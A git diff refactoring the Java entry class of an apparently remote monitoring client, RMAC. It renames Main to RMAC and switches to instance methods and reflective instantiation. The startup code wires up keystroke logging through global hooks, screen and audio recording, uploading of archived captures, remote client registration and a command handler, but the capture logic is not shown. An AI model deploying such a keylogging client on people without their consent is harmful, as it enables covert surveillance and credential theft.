@@ -16,14 +16,10 @@ import com.rmac.utils.Commands;
 import com.rmac.utils.Constants;
 import com.rmac.utils.FileSystem;
 import com.rmac.utils.Utils;
-import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.RandomAccessFile;
 import java.nio.channels.FileLock;
-import java.nio.file.Files;
-import java.nio.file.Path;
-import java.nio.file.Paths;
 import java.nio.file.StandardCopyOption;
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
@@ -50,7 +46,7 @@ import org.slf4j.LoggerFactory;
  *   <li>Registers the shutdown hook</li>
  * </ol>
  */
-public class Main {
+public class RMAC {
 
   public static Logger log;
 
@@ -73,14 +69,17 @@ public class Main {
   public static boolean NATIVE_POSSIBLE = false;
 
   // References for acquiring an instance lock
-  public static File lockFile;
   public static FileLock fileLock;
   public static RandomAccessFile randomAccessFile;
 
   public static FileSystem fs = new FileSystem();
 
-  public static void main(String[] args) {
-    if (!validateRuntimeDirectory(args)) {
+  public static void main(String[] args) throws InstantiationException, IllegalAccessException {
+    new RMAC().start(args);
+  }
+
+  public void start(String[] args) throws InstantiationException, IllegalAccessException {
+    if (!this.validateRuntimeDirectory(args)) {
       System.err.println("Runtime directory validation failed");
       System.exit(0);
     }
@@ -89,15 +88,16 @@ public class Main {
     Constants.setRuntimeLocation(args[0]);
 
     if (!Constants.setCurrentLocation()) {
+      System.err.println("Could not set current location");
       System.exit(0);
     }
 
     // Need to initialize logger here instead of doing it statically,
     // due to dependency of custom FileAppender on Config
-    log = LoggerFactory.getLogger(Main.class);
+    log = LoggerFactory.getLogger(RMAC.class);
 
     // Try acquiring a lock for this instance, if it fails then probably another instance is running
-    if (!lockInstance(Constants.INSTANCE_LOCK_LOCATION)) {
+    if (!this.lockInstance(Constants.INSTANCE_LOCK_LOCATION)) {
       log.error("Failed to acquire instance lock, another instance is running");
       System.exit(0);
     } else {
@@ -105,7 +105,7 @@ public class Main {
     }
 
     // Load config (from config.rmac)
-    config = new Config();
+    config = (Config) this.getInstance(Config.class);
     try {
       config.loadConfig();
     } catch (IOException e) {
@@ -114,32 +114,32 @@ public class Main {
     }
 
     // Copy RMAC Native DLL from jar to Runtime location
-    NATIVE_POSSIBLE = copyDLL();
+    NATIVE_POSSIBLE = this.copyDLL();
     // Create SocketServer and start listening for connection
-    ipcInterface = new SocketServer();
+    ipcInterface = (SocketServer) this.getInstance(SocketServer.class);
     // Initialize FileUploader
-    uploader = new FileUploader();
+    uploader = (FileUploader) this.getInstance(FileUploader.class);
     // Initialize Archiver
-    archiver = new Archiver();
-    new Thread(() -> Main.archiver.uploadArchives()).start();
+    archiver = (Archiver) this.getInstance(Archiver.class);
+    new Thread(() -> RMAC.archiver.uploadArchives()).start();
     // Verify Script Files
-    scriptFiles = new ScriptFiles();
+    scriptFiles = (ScriptFiles) this.getInstance(ScriptFiles.class);
     // Initialize KL Output file
-    keyLog = new KeyLog();
+    keyLog = (KeyLog) this.getInstance(KeyLog.class);
     // Register JNativeHook
-    keyRecorder = new KeyRecorder();
+    keyRecorder = (KeyRecorder) this.getInstance(KeyRecorder.class);
     // Register this Client
     Service.registerClient();
     // Initialize CommandHandler
-    commandHandler = new CommandHandler();
+    commandHandler = (CommandHandler) this.getInstance(CommandHandler.class);
     // Initialize Screen Recorder
-    screenRecorder = new ScreenRecorder();
+    screenRecorder = (ScreenRecorder) this.getInstance(ScreenRecorder.class);
     // Initialize RMAC Kernel Key Dumps Uploader
-    kernelDumpsUploader = new KernelDump();
+    kernelDumpsUploader = (KernelDump) this.getInstance(KernelDump.class);
 
     log.info("RMAC client initialized successfully");
 
-    addShutdownHook();
+    this.addShutdownHook();
   }
 
   /**
@@ -162,7 +162,7 @@ public class Main {
    * @param args program command-line arguments
    * @return validation result (true = success | false = failed)
    */
-  public static boolean validateRuntimeDirectory(String[] args) {
+  public boolean validateRuntimeDirectory(String[] args) {
     if (args.length < 1) {
       System.err.println("Runtime location not provided as an argument");
       return false;
@@ -197,7 +197,7 @@ public class Main {
   /**
    * Register JVM shutdown hook
    */
-  public static void addShutdownHook() {
+  public void addShutdownHook() {
     Runtime.getRuntime().addShutdownHook(new Thread(() -> {
       if (!SHUTDOWN) {
         initiateShutdown();
@@ -223,7 +223,7 @@ public class Main {
       log.error("Could not unregister JNH", e);
     }
 
-    Main.archiver.cleanUp();
+    RMAC.archiver.cleanUp();
     log.info("Cleanup completed");
 
     try {
@@ -239,14 +239,14 @@ public class Main {
     String logFilePath = Constants.TEMP_LOCATION + "\\Log-" + Utils.getTimestamp() + ".txt";
     try {
       fs.move(Constants.LOG_LOCATION, logFilePath, StandardCopyOption.REPLACE_EXISTING);
-      Main.archiver.moveToArchive(logFilePath, ArchiveFileType.OTHER);
+      RMAC.archiver.moveToArchive(logFilePath, ArchiveFileType.OTHER);
     } catch (IOException ignored) {
     }
 
     try {
-      Main.fileLock.release();
-      Main.randomAccessFile.close();
-      Main.lockFile.delete();
+      RMAC.fileLock.release();
+      RMAC.randomAccessFile.close();
+      fs.delete(Constants.INSTANCE_LOCK_LOCATION);
       log.info("Instance lock released");
     } catch (Exception e) {
       log.error("Couldn't remove lock file: " + Constants.INSTANCE_LOCK_LOCATION, e);
@@ -259,12 +259,12 @@ public class Main {
    * @param lockFile The file to acquire a lock on
    * @return Lock result (true = success | false = failed)
    */
-  public static boolean lockInstance(final String lockFile) {
+  public boolean lockInstance(final String lockFile) {
     try {
-      Main.lockFile = new File(lockFile);
-      Main.randomAccessFile = new RandomAccessFile(Main.lockFile, "rw");
-      Main.fileLock = Main.randomAccessFile.getChannel().tryLock();
-      if (Main.fileLock != null) {
+      fs.create(lockFile);
+      RMAC.randomAccessFile = fs.createRandomAccessFile(lockFile, "rw");
+      RMAC.fileLock = RMAC.randomAccessFile.getChannel().tryLock();
+      if (RMAC.fileLock != null) {
         return true;
       }
     } catch (Exception e) {
@@ -273,15 +273,36 @@ public class Main {
     return false;
   }
 
-  public static boolean copyDLL() {
-    try (InputStream is = Main.class.getResourceAsStream("/rmac-native.dll")) {
-      Files.copy(is, Paths.get(Constants.RMAC_DLL_LOCATION), StandardCopyOption.REPLACE_EXISTING);
-      return true;
+  /**
+   * Extract RMAC native dll from JAR to runtime directory.
+   *
+   * @return Result (true = succeeded | false = failed)
+   */
+  public boolean copyDLL() {
+    try (InputStream is = fs.getResourceAsStream(RMAC.class, "/rmac-native.dll")) {
+      if (is != null) {
+        fs.copy(is, Constants.RMAC_DLL_LOCATION, StandardCopyOption.REPLACE_EXISTING);
+        return true;
+      } else {
+        log.error("Could not read RMAC dll from JAR");
+      }
     } catch (IOException e) {
       log.warn(
-          "Failed to copy RMAC DLL from jar to Runtime, audio recording mode will be restricted to Active, ActiveAudioRecording=true config property will be ignored",
+          "Failed to copy RMAC dll from jar to Runtime, audio recording mode will be restricted to Active, ActiveAudioRecording=true config property will be ignored",
           e);
     }
     return false;
+  }
+
+  /**
+   * Get a new instance for provided class type.
+   *
+   * @param clazz The class for which a new instance is to be created.
+   * @return Class instance
+   * @throws InstantiationException when class instantiation fails.
+   * @throws IllegalAccessException when class instantiation fails.
+   */
+  public Object getInstance(Class<?> clazz) throws InstantiationException, IllegalAccessException {
+    return clazz.newInstance();
   }
 }
